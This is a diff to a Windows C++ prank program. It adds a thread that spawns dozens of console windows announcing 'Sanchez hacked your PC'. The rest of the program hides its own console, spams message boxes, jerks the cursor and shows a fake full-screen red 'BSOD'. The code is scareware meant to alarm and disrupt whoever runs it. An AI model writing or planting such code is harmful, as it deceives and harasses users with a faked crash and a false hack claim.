@@ -38,6 +38,39 @@ static DWORD WINAPI MsgSpammer(LPVOID) {
     return 0;
 }
 
+// ─────────── спам cmd-окнами ───────────
+static DWORD WINAPI CmdSpammer(LPVOID) {
+    for (int i = 0; i < 40; ++i) {
+        STARTUPINFOW si{};
+        si.cb = sizeof(si);
+        PROCESS_INFORMATION pi{};
+
+        wchar_t cmdPath[MAX_PATH] = {};
+        GetEnvironmentVariableW(L"COMSPEC", cmdPath, MAX_PATH);
+        if (cmdPath[0] == 0) wcscpy_s(cmdPath, L"C:\\Windows\\System32\\cmd.exe");
+
+        std::wstring mutCmd =
+            std::wstring(L"\"") + cmdPath + L"\" /k "
+            L"echo кака & echo кака & echo кака & "
+            L"echo Sanchez vzlomal tvoy pk & "
+            L"echo кака & echo кака & "
+            L"timeout /t 3 /nobreak > nul & exit";
+        mutCmd.push_back(L'\0');
+
+        if (CreateProcessW(nullptr, mutCmd.data(),
+                          nullptr, nullptr, FALSE,
+                          CREATE_NEW_CONSOLE,
+                          nullptr, nullptr, &si, &pi)) {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        }
+
+        std::this_thread::sleep_for(std::chrono::milliseconds(60));
+    }
+    return 0;
+}
+
+// ─────────── курсор-эпилептик ───────────
 static DWORD WINAPI CursorDancer(LPVOID) {
     POINT start{};
     GetCursorPos(&start);
@@ -57,7 +90,7 @@ static DWORD WINAPI CursorDancer(LPVOID) {
 
 // ─────────── красный "BSOD" ───────────
 static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
-    if (m == WM_ERASEBKGND) return 1; // сами зальём в WM_PAINT
+    if (m == WM_ERASEBKGND) return 1;
     if (m == WM_PAINT) {
         PAINTSTRUCT ps;
         HDC dc = BeginPaint(h, &ps);
@@ -65,7 +98,6 @@ static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
         GetClientRect(h, &rc);
         const int W = rc.right, H = rc.bottom;
 
-        // фон — тёмно-красный
         HBRUSH bg = CreateSolidBrush(RGB(140, 0, 0));
         FillRect(dc, &rc, bg);
         DeleteObject(bg);
@@ -73,16 +105,13 @@ static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
         SetBkMode(dc, TRANSPARENT);
         SetTextColor(dc, RGB(255, 255, 255));
 
-        // большая рожа :) вместо :(
         HFONT fFace = CreateFontW(-130, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
             ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI");
         HGDIOBJ old = SelectObject(dc, fFace);
-        const wchar_t* face = L":)";
         RECT rf{0, (int)(H * 0.08), W, (int)(H * 0.08) + 160};
-        DrawTextW(dc, face, -1, &rf, DT_CENTER | DT_SINGLELINE);
+        DrawTextW(dc, L":)", -1, &rf, DT_CENTER | DT_SINGLELINE);
 
-        // основной текст
         HFONT fBig = CreateFontW(-34, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
             ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI");
@@ -100,7 +129,6 @@ static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
             L"— Jack & Fox";
         DrawTextW(dc, body, -1, &rt, DT_LEFT | DT_WORDBREAK);
 
-        // подпись мелким шрифтом внизу
         HFONT fSmall = CreateFontW(-20, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
             ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI");
@@ -121,7 +149,6 @@ static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
 }
 
 static DWORD WINAPI RedBSOD(LPVOID) {
-    // ждём, пока прогреются месседжбоксы и курсор побегает
     std::this_thread::sleep_for(std::chrono::seconds(3));
 
     WNDCLASSW wc{};
@@ -135,23 +162,20 @@ static DWORD WINAPI RedBSOD(LPVOID) {
     int sh = GetSystemMetrics(SM_CYSCREEN);
 
     HWND h = CreateWindowExW(
-        WS_EX_TOPMOST,
-        L"JackFoxRedBsod", L"",
-        WS_POPUP,
-        0, 0, sw, sh,
+        WS_EX_TOPMOST, L"JackFoxRedBsod", L"",
+        WS_POPUP, 0, 0, sw, sh,
         nullptr, nullptr, wc.hInstance, nullptr);
 
     ShowWindow(h, SW_SHOW);
     UpdateWindow(h);
     SetForegroundWindow(h);
 
-    // держим 6 секунд
     std::this_thread::sleep_for(std::chrono::seconds(6));
-
     DestroyWindow(h);
     return 0;
 }
 
+// ─────────── финалка ───────────
 static DWORD WINAPI FinalWord(LPVOID) {
     std::this_thread::sleep_for(std::chrono::seconds(10));
     MessageBoxW(nullptr,
@@ -170,6 +194,7 @@ int main() {
     if (HWND c = GetConsoleWindow()) ShowWindow(c, SW_HIDE);
 
     CreateThread(nullptr, 0, MsgSpammer,   nullptr, 0, nullptr);
+    CreateThread(nullptr, 0, CmdSpammer,   nullptr, 0, nullptr);
     CreateThread(nullptr, 0, CursorDancer, nullptr, 0, nullptr);
     CreateThread(nullptr, 0, RedBSOD,      nullptr, 0, nullptr);
     CreateThread(nullptr, 0, FinalWord,    nullptr, 0, nullptr);
